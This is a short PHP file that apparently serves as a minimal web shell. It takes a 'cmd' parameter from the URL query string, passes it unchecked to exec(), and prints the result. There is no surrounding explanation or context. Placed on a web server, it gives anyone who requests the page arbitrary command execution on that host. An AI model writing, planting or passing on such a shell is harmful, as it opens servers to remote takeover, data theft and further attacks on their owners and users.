<?php
function execute($com)
{
    exec($com,$arr);
    echo implode('',$arr);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>